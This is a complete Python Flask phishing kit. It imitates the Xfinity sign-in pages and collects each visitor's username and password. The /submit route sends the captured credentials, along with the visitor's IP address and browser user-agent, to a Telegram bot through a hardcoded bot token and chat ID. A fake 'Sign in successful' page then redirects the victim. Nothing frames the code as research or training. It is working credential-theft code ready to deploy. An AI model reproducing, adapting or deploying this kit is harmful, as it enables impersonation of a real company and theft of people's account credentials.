from flask import Flask, request, render_template_string, session, redirect, url_for
import requests
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

BOT_TOKEN = "8818220529:AAH0GVcOuBCNYcTjBoSPyLshs1bFQuxzckA"
CHAT_ID = "974243158"

# PAGE 1 - Username/ID page (exact match to FINITY 1.jfif)
PAGE1 = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xfinity Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }
        body {
            background: #e8e8e8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            max-width: 420px;
            width: 100%;
            padding: 35px 30px 30px;
            border-radius: 6px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.12);
        }
        .logo {
            font-size: 32px;
            font-weight: 700;
            color: #000;
            margin-bottom: 28px;
            letter-spacing: -0.3px;
        }
        .logo span {
            color: #0066cc;
        }
        h2 {
            font-size: 20px;
            font-weight: 400;
            color: #1a1a1a;
            margin-bottom: 18px;
        }
        .field-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 4px;
        }
        input[type="text"],
        input[type="email"] {
            width: 100%;
            padding: 11px 12px;
            font-size: 15px;
            border: 1px solid #b8b8b8;
            border-radius: 4px;
            background: #fff;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #0066cc;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0,102,204,0.15);
        }
        .links {
            margin: 10px 0 16px;
            font-size: 13px;
        }
        .links a {
            color: #0066cc;
            text-decoration: none;
            margin-right: 16px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .terms {
            font-size: 12px;
            color: #666;
            margin: 14px 0 20px;
            line-height: 1.5;
        }
        .terms a {
            color: #0066cc;
            text-decoration: none;
        }
        .terms a:hover {
            text-decoration: underline;
        }
        .btn {
            background: #0066cc;
            color: white;
            border: none;
            padding: 13px 0;
            font-size: 17px;
            font-weight: 600;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #004d99;
        }
        .new-to {
            margin-top: 18px;
            font-size: 13px;
            padding-top: 16px;
            border-top: 1px solid #d0d0d0;
        }
        .new-to a {
            color: #0066cc;
            font-weight: 600;
            text-decoration: none;
        }
        .new-to a:hover {
            text-decoration: underline;
        }
        .url-note {
            margin-top: 14px;
            font-size: 11px;
            color: #999;
            text-align: center;
            word-break: break-all;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">xfinity</div>
    
    <form method="POST" action="/password">
        <h2>Sign in with your Xfinity ID</h2>
        
        <div class="field-group">
            <label for="username">Email, mobile, or username</label>
            <input type="text" id="username" name="username" placeholder="Enter your Xfinity ID" required autofocus>
        </div>

        <div class="links">
            <a href="#">Find your Xfinity ID</a>
            <a href="#">Create a new Xfinity ID</a>
        </div>

        <div class="terms">
            By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
        </div>

        <button type="submit" class="btn">Let's go</button>

        <div class="new-to">
            New to Xfinity? <a href="#">View exclusive offers &gt; near you</a>
        </div>

        <div class="url-note">
            22j6js.easypanel.host
        </div>
    </form>
</div>
</body>
</html>
'''

# PAGE 2 - Password page (exact match to FINITY2.jfif)
PAGE2 = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xfinity Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }
        body {
            background: #e8e8e8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            max-width: 420px;
            width: 100%;
            padding: 35px 30px 30px;
            border-radius: 6px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.12);
        }
        .logo {
            font-size: 32px;
            font-weight: 700;
            color: #000;
            margin-bottom: 28px;
            letter-spacing: -0.3px;
        }
        .logo span {
            color: #0066cc;
        }
        h2 {
            font-size: 20px;
            font-weight: 400;
            color: #1a1a1a;
            margin-bottom: 18px;
        }
        .field-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 4px;
        }
        input[type="password"] {
            width: 100%;
            padding: 11px 12px;
            font-size: 15px;
            border: 1px solid #b8b8b8;
            border-radius: 4px;
            background: #fff;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #0066cc;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0,102,204,0.15);
        }
        .forgot {
            text-align: right;
            margin: -4px 0 14px;
        }
        .forgot a {
            color: #0066cc;
            text-decoration: none;
            font-size: 13px;
        }
        .forgot a:hover {
            text-decoration: underline;
        }
        .terms {
            font-size: 12px;
            color: #666;
            margin: 14px 0 20px;
            line-height: 1.5;
        }
        .terms a {
            color: #0066cc;
            text-decoration: none;
        }
        .terms a:hover {
            text-decoration: underline;
        }
        .btn {
            background: #0066cc;
            color: white;
            border: none;
            padding: 13px 0;
            font-size: 17px;
            font-weight: 600;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #004d99;
        }
        .checkbox-row {
            display: flex;
            align-items: center;
            margin: 8px 0 16px;
        }
        .checkbox-row input {
            width: 17px;
            height: 17px;
            margin-right: 8px;
        }
        .checkbox-row label {
            font-weight: 400;
            font-size: 14px;
            color: #333;
        }
        .sign-in-as {
            margin-top: 14px;
            font-size: 13px;
        }
        .sign-in-as a {
            color: #0066cc;
            text-decoration: none;
        }
        .sign-in-as a:hover {
            text-decoration: underline;
        }
        .trouble {
            margin-top: 8px;
            font-size: 13px;
        }
        .trouble a {
            color: #0066cc;
            text-decoration: none;
        }
        .trouble a:hover {
            text-decoration: underline;
        }
        .url-note {
            margin-top: 14px;
            font-size: 11px;
            color: #999;
            text-align: center;
            word-break: break-all;
        }
        .username-display {
            background: #f5f5f5;
            padding: 10px 14px;
            border-radius: 4px;
            margin-bottom: 16px;
            font-size: 14px;
            color: #333;
            border-left: 3px solid #0066cc;
            word-break: break-all;
        }
        .username-display strong {
            color: #0066cc;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">xfinity</div>
    
    <form method="POST" action="/submit">
        <h2>Enter your password</h2>
        
        <div class="username-display">
            <strong>Signing in as:</strong> {{ username }}
        </div>
        
        <div class="field-group">
            <label for="password">Enter your password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required autofocus>
        </div>

        <div class="forgot">
            <a href="#">Forgot password?</a>
        </div>

        <div class="checkbox-row">
            <input type="checkbox" id="keepSigned" name="keep_signed" value="on">
            <label for="keepSigned">Keep me signed in</label>
        </div>

        <div class="terms">
            By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
        </div>

        <button type="submit" class="btn">Sign in</button>

        <div class="sign-in-as">
            <a href="/">Sign in as someone else</a>
        </div>

        <div class="trouble">
            <a href="#">Trouble signing in?</a> <a href="#" style="font-weight:600;">Get help</a>
        </div>

        <div class="url-note">
            22j6js.easypanel.host
        </div>
    </form>
</div>
</body>
</html>
'''

# SUCCESS PAGE
SUCCESS = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
        body { background: #e8e8e8; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .box { background: white; max-width: 400px; width: 100%; padding: 45px 30px; border-radius: 6px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.12); }
        .check { color: #28a745; font-size: 52px; margin-bottom: 12px; }
        h2 { font-size: 22px; font-weight: 500; color: #1a1a1a; margin-bottom: 8px; }
        p { color: #555; font-size: 15px; margin-bottom: 6px; }
        .url { font-size: 11px; color: #999; margin-top: 18px; word-break: break-all; }
        .spinner { display: inline-block; margin-top: 16px; width: 30px; height: 30px; border: 3px solid #e0e0e0; border-top-color: #0066cc; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <div class="check">✓</div>
        <h2>Sign in successful</h2>
        <p>Redirecting you to your dashboard...</p>
        <div class="spinner"></div>
        <div class="url">22j6js.easypanel.host</div>
    </div>
    <script>
        setTimeout(function() {
            window.location.href = '/';
        }, 2000);
    </script>
</body>
</html>
'''

@app.route('/')
def page1():
    return render_template_string(PAGE1)

@app.route('/password', methods=['POST'])
def page2():
    username = request.form.get('username', '').strip()
    if not username:
        return redirect('/')
    session['username'] = username
    return render_template_string(PAGE2, username=username)

@app.route('/submit', methods=['POST'])
def submit():
    username = session.get('username', 'Unknown')
    password = request.form.get('password', '').strip()
    keep_signed = request.form.get('keep_signed', 'off')
    
    # Build message for Telegram
    msg = f"🔐 XFINITY LOGIN CAPTURE\n"
    msg += f"━━━━━━━━━━━━━━━━━━\n"
    msg += f"📧 Username/ID: {username}\n"
    msg += f"🔑 Password: {password}\n"
    msg += f"✅ Keep signed in: {keep_signed}\n"
    msg += f"🌐 IP: {request.remote_addr}\n"
    msg += f"🖥️ User-Agent: {request.headers.get('User-Agent', 'Unknown')[:50]}\n"
    msg += f"━━━━━━━━━━━━━━━━━━"
    
    # Send to Telegram
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": msg}
    
    try:
        r = requests.post(url, json=payload, timeout=5)
        session.clear()
        if r.status_code == 200:
            return render_template_string(SUCCESS)
        else:
            return f"<h3>Error</h3><p>Status: {r.status_code}</p>"
    except Exception as e:
        return f"<h3>Connection Error</h3><p>{str(e)}</p>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
